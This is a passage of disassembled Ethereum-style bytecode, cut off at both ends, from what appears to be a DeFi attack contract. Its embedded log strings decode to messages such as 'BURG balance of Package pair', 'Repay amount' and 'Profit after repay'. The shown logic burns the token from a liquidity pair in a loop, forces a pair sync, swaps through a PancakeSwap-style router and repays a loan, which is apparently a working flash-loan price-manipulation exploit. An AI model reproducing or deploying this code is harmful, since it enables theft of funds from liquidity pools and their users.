SWAP1 DUP2 ADD DUP4 SWAP1 MSTORE PUSH32 0x486F77206D7563682049206E65656420666F7220616E6F746865722073776170 PUSH1 0x60 DUP3 ADD MSTORE SWAP2 DUP3 ADD MSTORE PUSH1 0x80 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 JUMPDEST PUSH1 0x8D DUP2 LT ISZERO PUSH2 0x1DDA JUMPI PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x2770A7EB PUSH1 0xE2 SHL DUP2 MSTORE PUSH20 0x2B0551B656509754285EEC81EE894338E14C5DD PUSH1 0x4 DUP3 ADD MSTORE PUSH10 0x43C25E0DCC1BD1C0000 PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x9DC29FAC SWAP1 PUSH1 0x44 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1DAF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1DC3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP DUP1 DUP1 PUSH2 0x1DD2 SWAP1 PUSH2 0x2E3A JUMP JUMPDEST SWAP2 POP POP PUSH2 0x1D3D JUMP JUMPDEST POP PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE PUSH20 0x2B0551B656509754285EEC81EE894338E14C5DD PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1E45 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1E69 SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1EB0 SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x1C SWAP1 DUP3 ADD MSTORE PUSH32 0x425552472062616C616E6365206F66205061636B616765207061697200000000 PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0x80 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH20 0x2B0551B656509754285EEC81EE894338E14C5DD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xFFF6CAE9 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1F07 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1F1B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH2 0x1F53 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x1F87 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x1FBB PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x1FEF PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x2023 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x2057 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x208B PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x20BF PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x20F3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x2127 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x215B PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x218F PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x21C3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x21F7 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x222B PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x225F PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x2293 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x22C7 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH2 0x22FB PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH10 0x43C33C1937564800000 PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH2 0x2391 SWAP2 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x2365 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2389 SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x23E7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x240B SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x245E SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x23 SWAP1 DUP3 ADD MSTORE PUSH32 0x425552472062616C616E6365206F6620636F6E74726163742061667465722073 PUSH1 0x60 DUP3 ADD MSTORE PUSH3 0x77617 PUSH1 0xEC SHL PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 PUSH2 0x3E5 PUSH2 0x2476 DUP7 PUSH1 0x3 PUSH2 0x2E53 JUMP JUMPDEST PUSH2 0x2480 SWAP2 SWAP1 PUSH2 0x2E72 JUMP JUMPDEST PUSH2 0x248B SWAP1 PUSH1 0x1 PUSH2 0x2E94 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x2499 DUP3 DUP8 PUSH2 0x2E94 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0xA9059CBB PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP11 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD DUP4 SWAP1 MSTORE SWAP2 SWAP3 POP SWAP1 DUP9 AND SWAP1 PUSH4 0xA9059CBB SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x24EC JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2510 SWAP2 SWAP1 PUSH2 0x2EAC JUMP JUMPDEST POP PUSH1 0x40 DUP1 MLOAD DUP2 DUP2 MSTORE PUSH1 0xC DUP2 DUP4 ADD MSTORE PUSH12 0x14995C185E48185B5BDD5B9D PUSH1 0xA2 SHL PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD DUP4 SWAP1 MSTORE SWAP1 MLOAD PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 DUP2 SWAP1 SUB PUSH1 0x80 ADD SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x25AA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x25CE SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x260C SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x14 SWAP1 DUP3 ADD MSTORE PUSH20 0x283937B334BA1030B33A32B9103932B830BC9D1 PUSH1 0x65 SHL PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0x80 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x18160DDD PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 MLOAD PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP2 PUSH4 0x18160DDD SWAP2 PUSH1 0x4 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x266B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x268F SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x26CB SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x12 SWAP1 DUP3 ADD MSTORE PUSH18 0x2A37BA30B610212AA9239039BAB838363C9 PUSH1 0x75 SHL PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0x80 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP POP POP POP POP POP POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0xE6A43905 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH20 0x8AC76A51CC950D9822D68B83FE1AD97B32CD580D PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x0 SWAP1 PUSH20 0xCA143CE32FE78F1F7019D7D551A6402FC5350C73 SWAP1 PUSH4 0xE6A43905 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x2759 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x277D SWAP2 SWAP1 PUSH2 0x2C59 JUMP JUMPDEST SWAP1 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND PUSH2 0x27CC JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x5061697220646F65736E27742065786973747321 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x21C JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xDFE1681 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x280C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2830 SWAP2 SWAP1 PUSH2 0x2C59 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xD21220A7 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x2872 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2896 SWAP2 SWAP1 PUSH2 0x2C59 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP7 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ PUSH2 0x28BA JUMPI PUSH1 0x0 PUSH2 0x28BC JUMP JUMPDEST DUP5 JUMPDEST SWAP1 POP PUSH1 0x0 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP8 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ PUSH2 0x28E0 JUMPI PUSH1 0x0 PUSH2 0x28E2 JUMP JUMPDEST DUP6 JUMPDEST SWAP1 POP DUP5 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x22C0D9F DUP4 DUP4 ADDRESS DUP12 DUP12 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x291D SWAP3 SWAP2 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 SWAP1 SWAP3 AND DUP3 MSTORE PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0x40 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP6 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x294B SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x2ECE JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2965 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2979 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH20 0x2B0551B656509754285EEC81EE894338E14C5DD PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP2 ADD DUP5 SWAP1 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x29E7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2A0B SWAP2 SWAP1 PUSH2 0x2EAC JUMP JUMPDEST POP PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP2 ADD DUP5 SWAP1 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2A67 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2A8B SWAP2 SWAP1 PUSH2 0x2EAC JUMP JUMPDEST POP PUSH1 0x40 DUP1 MLOAD PUSH1 0x2 DUP1 DUP3 MSTORE PUSH1 0x60 DUP1 DUP4 ADD DUP5 MSTORE SWAP3 PUSH1 0x20 DUP4 ADD SWAP1 DUP1 CALLDATASIZE DUP4 CALLDATACOPY ADD SWAP1 POP POP SWAP1 POP DUP6 DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x2AC0 JUMPI PUSH2 0x2AC0 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 MSTORE POP POP DUP5 DUP2 PUSH1 0x1 DUP2 MLOAD DUP2 LT PUSH2 0x2AF4 JUMPI PUSH2 0x2AF4 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 